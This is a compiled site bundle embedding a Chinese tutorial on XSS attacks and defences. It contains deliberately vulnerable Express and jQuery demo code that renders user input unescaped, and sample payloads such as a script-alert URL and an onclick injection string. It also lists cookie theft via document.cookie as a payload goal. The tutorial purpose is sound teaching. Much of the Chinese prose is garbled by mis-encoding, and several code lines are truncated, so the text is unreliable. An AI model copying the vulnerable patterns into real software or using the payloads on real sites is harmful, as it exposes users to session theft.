import{_ as s,c as a,a as e,o as p}from"./app-CD1YpnS1.js";const t={};function l(i,n){return p(),a("div",null,[...n[0]||(n[0]=[e(`<h1 id="webå®‰å…¨" tabindex="-1"><a class="header-anchor" href="#webå®‰å…¨"><span>Webå®‰å…¨</span></a></h1><h2 id="_1-xss-cross-site-script" tabindex="-1"><a class="header-anchor" href="#_1-xss-cross-site-script"><span>1. XSS(Cross-Site Script)</span></a></h2><ol><li>é»‘å®¢å¾€ç½‘é¡µé‡Œæ³¨å…¥æ¶æ„è„šæœ¬ä»£ç </li><li>å½“ç”¨æˆ·è®¿é—®æ—¶è·å–åˆ°åŒ…å«æ¶æ„ä»£ç çš„ç½‘é¡µ</li><li>é€šè¿‡æ¶æ„è„šæœ¬ï¼Œé»‘å®¢å¯ä»¥è·å–å’Œæ§åˆ¶ç”¨æˆ·ä¿¡æ¯</li></ol><h3 id="_1-1-åå°„å‹-éæŒä¹…å‹-xss" tabindex="-1"><a class="header-anchor" href="#_1-1-åå°„å‹-éæŒä¹…å‹-xss"><span>1.1 åå°„å‹(éæŒä¹…å‹)XSS</span></a></h3><p>è¯±å¯¼ç”¨æˆ·ç‚¹å‡»æ¶æ„é“¾æ¥æ¥é€ æˆä¸€æ¬¡æ€§æ”»å‡»</p><ol><li>é»‘å®¢æŠŠå¸¦æœ‰æ¶æ„è„šæœ¬ä»£ç å‚æ•°çš„URLåœ°å€å‘é€ç»™ç”¨æˆ·</li><li>ç”¨æˆ·ç‚¹å‡»æ­¤é“¾æ¥</li><li>æœåŠ¡å™¨ç«¯è·å–è¯·æ±‚å‚æ•°å¹¶ä¸”ç›´æ¥ä½¿ç”¨ï¼ŒæœåŠ¡å™¨åå°„å›ç»“æœé¡µé¢</li></ol><ul><li>åå°„å‹XSSæ”»å‡»æ˜¯ä¸€æ¬¡æ€§çš„ï¼Œå¿…é¡»è¦é€šè¿‡ç”¨æˆ·ç‚¹å‡»é“¾æ¥æ‰èƒ½å‘èµ·</li><li>ä¸€äº›æµè§ˆå™¨å¦‚Chromeå…¶å†…ç½®äº†ä¸€äº›XSSè¿‡æ»¤å™¨ï¼Œå¯ä»¥é˜²æ­¢å¤§éƒ¨åˆ†åå°„å‹XSSæ”»å‡»</li><li>åå°„å‹XSSå…¶å®å°±æ˜¯æœåŠ¡å™¨æ²¡æœ‰å¯¹æ¶æ„çš„ç”¨æˆ·è¾“å…¥è¿›è¡Œå®‰å…¨å¤„ç†å°±ç›´æ¥åå°„å“åº”å†…å®¹ï¼Œå¯¼è‡´æ¶æ„ä»£ç åœ¨æµè§ˆå™¨ä¸­æ‰§è¡Œçš„ä¸€ç§XSSæ¼æ´</li></ul><div class="language-javascript line-numbers-mode" data-highlighter="prismjs" data-ext="js"><pre><code class="language-javascript"><span class="line"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">&#39;express&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">&#39;fs&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">&#39;path&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token keyword">const</span> bodyParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">&#39;body-parser&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">extended</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">&#39;public&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token comment">//http://localhost:3000/list?category=%3Cscript%3Ealert(1)%3C/script%3E</span></span>
<span class="line">app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">&#39;/list&#39;</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">    <span class="token keyword">let</span> <span class="token punctuation">{</span> category <span class="token punctuation">}</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">;</span></span>
<span class="line">    res<span class="token punctuation">.</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">&#39;Content-Type&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;text/html;charset=utf-8&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">\`</span><span class="token string">ä½ è¾“å…¥çš„åˆ†ç±»æ˜¯: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">\${</span>category<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">\`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&#39;The server is starting at port 3000&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="_1-2-å­˜å‚¨å‹-æŒä¹…å‹-xss" tabindex="-1"><a class="header-anchor" href="#_1-2-å­˜å‚¨å‹-æŒä¹…å‹-xss"><span>1.2 å­˜å‚¨å‹(æŒä¹…å‹)XSS</span></a></h3><p>é»‘å®¢å°†ä»£ç å­˜å‚¨åˆ°æ¼æ´æœåŠ¡å™¨ä¸­ï¼Œç”¨æˆ·æµè§ˆç›¸å…³é¡µé¢å‘èµ·æ”»å‡»</p><ol><li>é»‘å®¢å°†æ¶æ„è„šæœ¬ä»£ç ä¸Šä¼ æˆ–å­˜å‚¨åˆ°æ¼æ´æœåŠ¡å™¨</li><li>æœåŠ¡å™¨æŠŠæ¶æ„è„šæœ¬ä¿å­˜åˆ°æœåŠ¡å™¨</li><li>å½“æ­£å¸¸å®¢æˆ·è®¿é—®æœåŠ¡å™¨æ—¶ï¼ŒæœåŠ¡å™¨ä¼šè¯»å–æ¶æ„æ•°æ®å¹¶ä¸”ç›´æ¥ä½¿ç”¨</li><li>æœåŠ¡å™¨ä¼šè¿”å›å«æœ‰æ¶æ„è„šæœ¬çš„é¡µé¢</li></ol><table><thead><tr><th style="text-align:left;">ç±»å‹</th><th style="text-align:left;">åå°„å‹</th><th style="text-align:left;">å­˜å‚¨å‹</th></tr></thead><tbody><tr><td style="text-align:left;">æŒä¹…æ€§</td><td style="text-align:left;">éæŒä¹…</td><td style="text-align:left;">æŒä¹…åŒ–(å­˜å‚¨åœ¨æœåŠ¡å™¨)</td></tr><tr><td style="text-align:left;">è§¦å‘æ—¶æœº</td><td style="text-align:left;">éœ€è¦ç”¨æˆ·ç‚¹å‡»</td><td style="text-align:left;">ä¸éœ€è¦ç”¨æˆ·äº¤äº’ä¹Ÿå¯ä»¥è§¦å‘</td></tr><tr><td style="text-align:left;">å±å®³</td><td style="text-align:left;">å±å®³è¾ƒå°</td><td style="text-align:left;">å±å®³æ›´å¤§</td></tr></tbody></table><p>public\\comment-list.html</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">&lt;!DOCTYPE html&gt;</span>
<span class="line">&lt;html lang=&quot;en&quot;&gt;</span>
<span class="line"></span>
<span class="line">&lt;head&gt;</span>
<span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span>
<span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span>
<span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;</span>
<span class="line">    &lt;title&gt;è¯„è®ºåˆ—è¡¨&lt;/title&gt;</span>
<span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.css&quot;&gt;</span>
<span class="line">&lt;/head&gt;</span>
<span class="line"></span>
<span class="line">&lt;body&gt;</span>
<span class="line">    &lt;div class=&quot;container&quot;&gt;</span>
<span class="line">        &lt;div class=&quot;row&quot;&gt;</span>
<span class="line">            &lt;div class=&quot;col-md-12&quot;&gt;</span>
<span class="line">                &lt;div class=&quot;panel panel-default&quot;&gt;</span>
<span class="line">                    &lt;div class=&quot;panel-heading&quot;&gt;</span>
<span class="line">                        &lt;h2&gt;è¯„è®ºåˆ—è¡¨&lt;/h2&gt;</span>
<span class="line">                    &lt;/div&gt;</span>
<span class="line">                    &lt;div class=&quot;panel-body&quot;&gt;</span>
<span class="line">                        &lt;ul class=&quot;list-group comment-list&quot;&gt;</span>
<span class="line"></span>
<span class="line">                        &lt;/ul&gt;</span>
<span class="line">                    &lt;/div&gt;</span>
<span class="line">                    &lt;div class=&quot;panel-footer&quot;&gt;</span>
<span class="line">                        &lt;div class=&quot;row&quot;&gt;</span>
<span class="line">                            &lt;div class=&quot;col-md-12&quot;&gt;</span>
<span class="line">                                &lt;form onsubmit=&quot;addComment(event)&quot;&gt;</span>
<span class="line">                                    &lt;div class=&quot;form-group&quot;&gt;</span>
<span class="line">                                        &lt;label for=&quot;username&quot;&gt;ç”¨æˆ·å&lt;/label&gt;</span>
<span class="line">                                        &lt;input id=&quot;username&quot; class=&quot;form-control&quot; placeholder=&quot;ç”¨æˆ·å&quot;&gt;</span>
<span class="line">                                    &lt;/div&gt;</span>
<span class="line">                                    &lt;div class=&quot;form-group&quot;&gt;</span>
<span class="line">                                        &lt;label for=&quot;content&quot;&gt;å†…å®¹&lt;/label&gt;</span>
<span class="line">                                        &lt;input id=&quot;content&quot; class=&quot;form-control&quot; placeholder=&quot;è¯·è¾“å…¥è¯„è®º&quot;&gt;</span>
<span class="line">                                    &lt;/div&gt;</span>
<span class="line">                                    &lt;div class=&quot;form-group&quot;&gt;</span>
<span class="line">                                        &lt;input type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;</span>
<span class="line">                                    &lt;/div&gt;</span>
<span class="line">                                &lt;/form&gt;</span>
<span class="line">                            &lt;/div&gt;</span>
<span class="line">                        &lt;/div&gt;</span>
<span class="line">                    &lt;/div&gt;</span>
<span class="line">                &lt;/div&gt;</span>
<span class="line">            &lt;/div&gt;</span>
<span class="line">        &lt;/div&gt;</span>
<span class="line">    &lt;/div&gt;</span>
<span class="line">    &lt;script src=&quot;https://cdn.bootcss.com/jquery/3.3.1/jquery.js&quot;&gt;&lt;/script&gt;</span>
<span class="line">    &lt;script&gt;</span>
<span class="line">        function getCommentList() {</span>
<span class="line">            $.get(&#39;/api/comments&#39;).then(comments =&gt; {</span>
<span class="line">                let html = comments.map(item =&gt; (</span>
<span class="line">                    \`</span>
<span class="line">                &lt;li class=&quot;list-group-item&quot;&gt;</span>
<span class="line">                        &lt;div class=&quot;media&quot;&gt;</span>
<span class="line">                            &lt;div class=&quot;media-left&quot;&gt;</span>
<span class="line">                                 &lt;a href=&quot;</span>
<span class="line">                                   &lt;img style=&quot;border-radius:5px&quot; class=&quot;media-object&quot; src=&quot;\${item.avatar}&quot; &gt;</span>
<span class="line">                                &lt;/a&gt;</span>
<span class="line">                            &lt;/div&gt;</span>
<span class="line">                            &lt;div class=&quot;media-body&quot;&gt;</span>
<span class="line">                                &lt;h4 class=&quot;media-heading&quot;&gt;ç”¨æˆ·å: \${item.username}&lt;/h4&gt;</span>
<span class="line">                                &lt;p&gt;å†…å®¹: \${item.content}&lt;/p&gt;</span>
<span class="line">                                &lt;p&gt;æ—¶é—´: \${item.time}&lt;/p&gt;</span>
<span class="line">                            &lt;/div&gt;</span>
<span class="line">                        &lt;/div&gt;</span>
<span class="line">                &lt;/li&gt;</span>
<span class="line">                \`</span>
<span class="line">                )).join(&#39;&#39;);</span>
<span class="line">                $(&#39;.comment-list&#39;).html(html);</span>
<span class="line">            });</span>
<span class="line">        }</span>
<span class="line">        getCommentList();</span>
<span class="line">        function addComment(event) {</span>
<span class="line">            event.preventDefault();</span>
<span class="line">             let username = $(&#39;</span>
<span class="line">             let content = $(&#39;</span>
<span class="line">            if (!content) return;</span>
<span class="line">            $.post(&#39;/api/comments&#39;, { username, content }).then(data =&gt; {</span>
<span class="line">                getCommentList();</span>
<span class="line">                 $(&#39;</span>
<span class="line">            });</span>
<span class="line">        }</span>
<span class="line">    &lt;/script&gt;</span>
<span class="line">&lt;/body&gt;</span>
<span class="line"></span>
<span class="line">&lt;/html&gt;</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>server.js</p><div class="language-javascript line-numbers-mode" data-highlighter="prismjs" data-ext="js"><pre><code class="language-javascript"><span class="line"><span class="token keyword">let</span> comments <span class="token operator">=</span> <span class="token punctuation">[</span></span>
<span class="line">    <span class="token punctuation">{</span> <span class="token literal-property property">avatar</span><span class="token operator">:</span> <span class="token string">&#39;http://cn.gravatar.com/avatar/01459f970ce17cd9e1e783160ecc951a&#39;</span><span class="token punctuation">,</span> <span class="token literal-property property">username</span><span class="token operator">:</span> <span class="token string">&#39;å¼ ä¸‰&#39;</span><span class="token punctuation">,</span> <span class="token literal-property property">content</span><span class="token operator">:</span> <span class="token string">&#39;ä»Šå¤©å¤©æ°”ä¸é”™&#39;</span><span class="token punctuation">,</span> <span class="token literal-property property">time</span><span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLocaleString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">,</span></span>
<span class="line">    <span class="token punctuation">{</span> <span class="token literal-property property">avatar</span><span class="token operator">:</span> <span class="token string">&#39;http://cn.gravatar.com/avatar/01459f970ce17cd9e1e783160ecc951a&#39;</span><span class="token punctuation">,</span> <span class="token literal-property property">username</span><span class="token operator">:</span> <span class="token string">&#39;æå››&#39;</span><span class="token punctuation">,</span> <span class="token literal-property property">content</span><span class="token operator">:</span> <span class="token string">&#39;æ˜¯çš„&#39;</span><span class="token punctuation">,</span> <span class="token literal-property property">time</span><span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLocaleString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">}</span></span>
<span class="line"><span class="token punctuation">]</span><span class="token punctuation">;</span></span>
<span class="line">app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">&#39;/api/comments&#39;</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">    res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span>comments<span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">&#39;/api/comments&#39;</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">    <span class="token keyword">let</span> comment <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">;</span></span>
<span class="line">    comments<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">{</span></span>
<span class="line">        <span class="token operator">...</span>comment<span class="token punctuation">,</span></span>
<span class="line">        <span class="token literal-property property">avatar</span><span class="token operator">:</span> <span class="token string">&#39;http://cn.gravatar.com/avatar/01459f970ce17cd9e1e783160ecc951a&#39;</span><span class="token punctuation">,</span></span>
<span class="line">        <span class="token literal-property property">time</span><span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLocaleString</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span>
<span class="line">    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span>comments<span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="_1-3-dom-basedå‹xss" tabindex="-1"><a class="header-anchor" href="#_1-3-dom-basedå‹xss"><span>1.3 DOM-Basedå‹XSS</span></a></h3><p>ä¸éœ€è¦æœåŠ¡å™¨ç«¯æ”¯æŒï¼Œæ˜¯ç”±äºDOMç»“æ„ä¿®æ”¹å¯¼è‡´çš„ï¼ŒåŸºäºæµè§ˆå™¨DOMè§£æçš„æ”»å‡»</p><ol><li>ç”¨æˆ·æ‰“å¼€å¸¦æœ‰æ¶æ„çš„é“¾æ¥</li><li>æµè§ˆå™¨åœ¨DOMè§£æçš„æ—¶å€™ç›´æ¥ä½¿ç”¨æ¶æ„æ•°æ®</li><li>ç”¨æˆ·ä¸­æ‹›</li><li>å¸¸è§çš„è§¦å‘åœºæ™¯å°±æ˜¯åœ¨ä¿®æ”¹innerHTML outerHTML document.writeçš„æ—¶å€™</li></ol><div class="language-javascript line-numbers-mode" data-highlighter="prismjs" data-ext="js"><pre><code class="language-javascript"><span class="line"><span class="token operator">&lt;</span>body<span class="token operator">&gt;</span></span>
<span class="line">    <span class="token operator">&lt;</span>h1<span class="token operator">&gt;</span>è¾“å…¥é“¾æ¥åœ°å€ï¼Œç„¶åç‚¹å‡»æŒ‰é’®<span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">&gt;</span></span>
<span class="line">    <span class="token operator">&lt;</span>div id<span class="token operator">=</span><span class="token string">&quot;content&quot;</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span></span>
<span class="line">    <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">&quot;text&quot;</span> id<span class="token operator">=</span><span class="token string">&quot;link&quot;</span><span class="token operator">&gt;</span></span>
<span class="line">    <span class="token operator">&lt;</span>button onclick<span class="token operator">=</span><span class="token string">&quot;setup()&quot;</span><span class="token operator">&gt;</span>è®¾ç½®<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">&gt;</span></span>
<span class="line">    <span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">&quot;https://cdn.bootcss.com/jquery/3.3.1/jquery.js&quot;</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span></span>
<span class="line">    <span class="token operator">&lt;</span>script<span class="token operator">&gt;</span></span>
<span class="line">        <span class="token keyword">function</span> <span class="token function">setup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">            <span class="token comment">// &quot; onclick=alert(1) //</span></span>
<span class="line">             <span class="token keyword">let</span> html <span class="token operator">=</span> \`<span class="token operator">&lt;</span>a href<span class="token operator">=</span>&quot;$<span class="token punctuation">{</span><span class="token function">$</span><span class="token punctuation">(</span>&#39;</span>
<span class="line">             <span class="token function">$</span><span class="token punctuation">(</span>&#39;</span>
<span class="line">        <span class="token punctuation">}</span></span>
<span class="line">    <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span></span>
<span class="line"><span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">&gt;</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="_1-4-payload" tabindex="-1"><a class="header-anchor" href="#_1-4-payload"><span>1.4 payload</span></a></h3><p>å®ç°XSSæ”»å‡»çš„æ¶æ„è„šæœ¬è¢«ç§°ä¸º <code>XSS payload</code></p><ul><li>çªƒå–ç”¨æˆ·çš„Cookie <code>document.cookie</code></li><li>è¯†åˆ«ç”¨æˆ·æµè§ˆå™¨ <code>navigator.userAgent</code></li><li>ä¼ªé€ è¯·æ±‚ GET POSTè¯·æ±‚</li><li>XSSé’“é±¼ é€šè¿‡XSSå‘ç½‘é¡µä¸Šæ³¨å…¥é’“é±¼é“¾æ¥ï¼Œè®©ç”¨æˆ·è®¿é—®å‡å†’çš„ç½‘ç«™</li></ul><h3 id="_1-5-å¦‚ä½•é˜²å¾¡xss" tabindex="-1"><a class="header-anchor" href="#_1-5-å¦‚ä½•é˜²å¾¡xss"><span>1.5 å¦‚ä½•é˜²å¾¡XSS</span></a></h3><ul><li>ç»™cookieè®¾ç½®httpOnlyå±æ€§ è„šæœ¬æ— æ³•è¯»å–è¯¥Cookie,è‡ªå·±ä¹Ÿä¸èƒ½ç”¨ï¼Œéæ ¹æœ¬è§£å†³XSS</li></ul><p>login.html</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">&lt;!DOCTYPE html&gt;</span>
<span class="line">&lt;html lang=&quot;en&quot;&gt;</span>
<span class="line"></span>
<span class="line">&lt;head&gt;</span>
<span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span>
<span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span>
<span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;</span>
<span class="line">    &lt;title&gt;ç™»å½•&lt;/title&gt;</span>
<span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.css&quot;&gt;</span>
<span class="line">&lt;/head&gt;</span>
<span class="line"></span>
<span class="line">&lt;body&gt;</span>
<span class="line">    &lt;div class=&quot;container&quot;&gt;</span>
<span class="line">        &lt;div class=&quot;row&quot;&gt;</span>
<span class="line">            &lt;div class=&quot;col-md-12&quot;&gt;</span>
<span class="line">                &lt;form onsubmit=&quot;login(event)&quot;&gt;</span>
<span class="line">                    &lt;div class=&quot;form-group&quot;&gt;</span>
<span class="line">                        &lt;label for=&quot;username&quot;&gt;ç”¨æˆ·å&lt;/label&gt;</span>
<span class="line">                        &lt;input id=&quot;username&quot; class=&quot;form-control&quot; placeholder=&quot;ç”¨æˆ·å&quot;&gt;</span>
<span class="line">                    &lt;/div&gt;</span>
<span class="line">                    &lt;div class=&quot;form-group&quot;&gt;</span>
<span class="line">                        &lt;label for=&quot;password&quot;&gt;å¯†ç &lt;/label&gt;</span>
<span class="line">                        &lt;input id=&quot;password&quot; class=&quot;form-control&quot; placeholder=&quot;å¯†ç &quot;&gt;</span>
<span class="line">                    &lt;/div&gt;</span>
<span class="line">                    &lt;div class=&quot;form-group&quot;&gt;</span>
<span class="line">                        &lt;input type=&quot;submit&quot; class=&quot;btn btn-primary&quot; value=&quot;ç™»å½•&quot;&gt;</span>
<span class="line">                    &lt;/div&gt;</span>
<span class="line">                &lt;/form&gt;</span>
<span class="line">            &lt;/div&gt;</span>
<span class="line">        &lt;/div&gt;</span>
<span class="line">    &lt;/div&gt;</span>
<span class="line">    &lt;/div&gt;</span>
<span class="line">    &lt;script src=&quot;https://cdn.bootcss.com/jquery/3.3.1/jquery.js&quot;&gt;&lt;/script&gt;</span>
<span class="line">    &lt;script&gt;</span>
<span class="line">        function login() {</span>
<span class="line">             let username = $(&#39;</span>
<span class="line">             let password = $(&#39;</span>
<span class="line">            $.post(&#39;/api/login&#39;, { username, password }).then(data =&gt; {</span>
<span class="line">                if (data.code == 0) {</span>
<span class="line">                    location.href = \`/user.html?username=\${username}\`;</span>
<span class="line">                }</span>
<span class="line">                 $(&#39;</span>
<span class="line">                 $(&#39;</span>
<span class="line">            });</span>
<span class="line">        }</span>
<span class="line">    &lt;/script&gt;</span>
<span class="line">&lt;/body&gt;</span>
<span class="line"></span>
<span class="line">&lt;/html&gt;</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>user.html</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">&lt;script&gt;</span>
<span class="line">        document.write(document.cookie);</span>
<span class="line">    &lt;/script&gt;</span>
